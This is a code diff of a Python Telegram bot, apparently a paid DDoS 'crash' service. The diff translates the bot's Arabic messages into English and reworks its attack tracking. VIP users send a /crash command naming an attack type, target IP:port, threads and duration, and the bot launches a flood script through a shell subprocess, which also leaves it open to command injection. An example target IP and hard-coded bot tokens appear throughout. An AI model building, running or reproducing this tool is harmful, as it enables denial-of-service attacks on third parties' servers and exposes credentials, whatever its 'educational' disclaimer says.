@@ -4,80 +4,80 @@ import signal
 import subprocess
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# التوكن الخاص بالبوت
-TOKEN = "7684261013:AAGDDOGFZ8Uz2Vlp8CCF_UWr9uLyi5X1ejc"
+# Telegram Bot Token
+TOKEN = "7109397811:AAGGULNr7b8I0ldq5DS4NJytZ7RSRyF389k"
 bot = telebot.TeleBot(TOKEN)
 
-# قائمة المستخدمين المسموح لهم
-ALLOWED_USERS = [1480248962]  # ضع هنا معرفات المستخدمين المسموح لهم باستعمال /crash و /addvip
+# Allowed Admins to use specific commands
+ALLOWED_USERS = [1480248962]  # Add Admin IDs here
 
-# لتتبع العمليات النشطة
-active_attacks = {}
-
-# قائمة المستخدمين الـ VIP مع عدد الأيام
+# VIP Users and their remaining days
 vip_users = {}
+
+# Active attacks tracking
+active_attacks = {}
 
 @bot.message_handler(commands=['start'])
 def handle_start_command(message):
     try:
         user_id = message.from_user.id
+        days_left = vip_users.get(user_id, 0)
 
-        # رسالة الترحيب
-        days_left = vip_users.get(user_id, 0)  # عدد الأيام المتبقية
         text = (
-            f"🤖 *مرحبًا بك في البوت!*\n\n"
-            f"✅ *حالتك:* {'VIP' if days_left > 0 else 'عادية'}\n"
-            f"⏳ *عدد الأيام المتبقية:* {days_left} يوم(s)\n"
-            f"📌 *للاستخدام:* /crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>\n\n"
-            f"💡 مثال:\n"
-            f"/crash UDP 143.92.125.230:10013 10 900\n"
-            f"⚠️ هذا البوت للاستخدام التعليمي فقط."
+            f"🤖 *WELCOME TO THE CRASH BOT!*\n\n"
+            f"✅ *YOUR STATUS:* {'VIP' if days_left > 0 else 'REGULAR USER'}\n"
+            f"⏳ *DAYS REMAINING:* {days_left if days_left > 0 else 'N/A'}\n\n"
+            f"📌 *HOW TO LAUNCH AN ATTACK:*\n"
+            f"/CRASH <TYPE> <IP/HOST:PORT> <THREADS> <MS>\n\n"
+            f"💡 EXAMPLE:\n"
+            f"/CRASH UDP 143.92.125.230:10013 10 900\n\n"
+            f"⚠️ *NOTE:* THIS BOT IS FOR EDUCATIONAL PURPOSES ONLY."
         )
 
-        bot.send_message(message.chat.id, text, parse_mode="Markdown")
+        markup = InlineKeyboardMarkup()
+        creator_button = InlineKeyboardButton("📱 CREATOR", url="https://t.me/MR3SKR")
+        markup.add(creator_button)
+
+        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
     except Exception as e:
-        bot.reply_to(message, f"صارت مشكلة: {str(e)}")
+        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")
 
 @bot.message_handler(commands=['addvip'])
 def handle_addvip_command(message):
     try:
-        # تحقق من الصلاحيات
         user_id = message.from_user.id
         if user_id not in ALLOWED_USERS:
-            bot.reply_to(message, "🚫 ليس لديك صلاحيات لاستخدام هذا الأمر!")
+            bot.reply_to(message, "🚫 YOU DO NOT HAVE PERMISSION TO USE THIS COMMAND!")
             return
 
-        # تحليل الأمر
         command_parts = message.text.split()
         if len(command_parts) != 3:
-            bot.reply_to(message, "⚠️ الاستخدام الصحيح: /addvip <ID المستخدم> <عدد الأيام>")
+            bot.reply_to(message, "⚠️ CORRECT USAGE: /ADDVIP <USER_ID> <DAYS>")
             return
 
         target_user_id = int(command_parts[1])
         days = int(command_parts[2])
 
-        # إضافة المستخدم إلى قائمة VIP
         vip_users[target_user_id] = days
-        bot.reply_to(message, f"✅ تم إضافة {days} يوم(s) للمستخدم {target_user_id}.")
+        bot.reply_to(message, f"✅ ADDED {days} DAY(S) FOR USER {target_user_id}.")
     except Exception as e:
-        bot.reply_to(message, f"صارت مشكلة: {str(e)}")
+        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")
 
 @bot.message_handler(commands=['crash'])
 def handle_crash_command(message):
     try:
         user_id = message.from_user.id
 
-        # تحقق إذا كان المستخدم VIP
         if vip_users.get(user_id, 0) <= 0:
-            bot.reply_to(message, "🚫 عذرًا، يجب أن تكون VIP لاستخدام هذا الأمر!")
+            bot.reply_to(message, "🚫 YOU MUST BE A VIP TO USE THIS COMMAND!")
             return
 
-        # تحليل الأمر
         command_parts = message.text.split()
         if len(command_parts) < 5:
             bot.reply_to(
                 message,
-                "⚠️ الاستخدام الصحيح:\n/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>\n\nمثال:\n/crash UDP 143.92.125.230:10013 10 900"
+                "⚠️ CORRECT USAGE:\n/CRASH <TYPE> <IP/HOST:PORT> <THREADS> <MS>\n\nEXAMPLE:\n/CRASH UDP 143.92.125.230:10013 10 900",
+                parse_mode="Markdown"
             )
             return
 
@@ -86,58 +86,62 @@ def handle_crash_command(message):
         threads = command_parts[3]
         duration = command_parts[4]
 
-        # تنفيذ الهجوم كعملية فرعية
-        command = f'python3 start.py {attack_type} {ip_port} {threads} {duration}'
-        process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
-        
-        # حفظ العملية في القائمة
-        active_attacks[user_id] = process
+        if ":" not in ip_port:
+            bot.reply_to(message, "INVALID FORMAT! PLEASE USE IP:PORT FORMAT.")
+            return
 
-        # الرد على المستخدم
+        ip, port = ip_port.split(":")
+        if not ip or not port.isdigit():
+            bot.reply_to(message, "INVALID IP OR PORT. PLEASE CHECK YOUR INPUT.")
+            return
+
+        command = f'python3 start.py {attack_type} {ip}:{port} {threads} {duration}'
+        process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
+
+        if user_id not in active_attacks:
+            active_attacks[user_id] = {}
+
+        active_attacks[user_id][ip_port] = process
+
         response = (
-            "[✅] الهجوم تم تشغيله بنجاح [✅]\n\n"
-            f"📍 الهدف: {ip_port}\n"
-            f"⚙️ النوع: {attack_type}\n"
-            f"🧵 الخيوط: {threads}\n"
-            f"⏳ المدة: {duration}ms\n"
-            "🔴 لإيقاف الهجوم، استخدم زر الإيقاف أدناه."
+            f"✅ *ATTACK LAUNCHED SUCCESSFULLY!*\n\n"
+            f"📍 *TARGET:* {ip}:{port}\n"
+            f"⚙️ *TYPE:* {attack_type}\n"
+            f"🧵 *THREADS:* {threads}\n"
+            f"⏳ *DURATION:* {duration}ms\n\n"
+            f"🔴 *PRESS THE BUTTON BELOW TO STOP THE ATTACK.*"
         )
 
-        # زر إيقاف الهجوم
         markup = InlineKeyboardMarkup()
-        stop_button = InlineKeyboardButton("إيقاف الهجوم", callback_data=f"stop_attack_{user_id}")
+        stop_button = InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_attack_{ip_port}")
         markup.add(stop_button)
 
-        bot.send_message(message.chat.id, response, reply_markup=markup)
-
+        bot.send_message(message.chat.id, response, reply_markup=markup, parse_mode="Markdown")
     except Exception as e:
-        bot.reply_to(message, f"صارت مشكلة: {str(e)}")
+        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('stop_attack'))
 def stop_attack(call):
     try:
-        # استخراج معرف المستخدم من callback_data
-        user_id = int(call.data.split("_")[2])
+        user_id = call.from_user.id
+        ip_port = call.data.split("_")[2]
 
-        # تحقق من وجود عملية للمستخدم
-        if user_id not in active_attacks:
-            bot.answer_callback_query(call.id, "لا توجد عملية نشطة لهذا المستخدم!")
+        if user_id not in active_attacks or ip_port not in active_attacks[user_id]:
+            bot.answer_callback_query(call.id, "NO ACTIVE ATTACK FOUND FOR THIS TARGET!")
             return
 
-        # الحصول على العملية وإيقافها
-        process = active_attacks[user_id]
-        os.killpg(os.getpgid(process.pid), signal.SIGTERM)  # إيقاف العملية بالكامل
+        process = active_attacks[user_id][ip_port]
+        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
 
-        # إزالة العملية من القائمة
-        del active_attacks[user_id]
+        del active_attacks[user_id][ip_port]
+        if not active_attacks[user_id]:
+            del active_attacks[user_id]
 
-        # إشعار بالإيقاف
-        bot.answer_callback_query(call.id, "تم إيقاف الهجوم بنجاح!")
-        bot.send_message(call.message.chat.id, "🛑 الهجوم تم إيقافه بنجاح.")
+        bot.answer_callback_query(call.id, "ATTACK STOPPED SUCCESSFULLY!")
+        bot.send_message(call.message.chat.id, f"🛑 *ATTACK ON {ip_port} HAS BEEN STOPPED.*", parse_mode="Markdown")
     except Exception as e:
-        bot.answer_callback_query(call.id, f"صارت مشكلة: {str(e)}")
-        bot.send_message(call.message.chat.id, f"صارت مشكلة: {str(e)}")
+        bot.answer_callback_query(call.id, f"AN ERROR OCCURRED: {str(e)}")
+        bot.send_message(call.message.chat.id, f"AN ERROR OCCURRED: {str(e)}")
 
-# تشغيل البوت
-print("بوت تليجرام يعمل...")
+print("BOT IS RUNNING...")
 bot.polling()
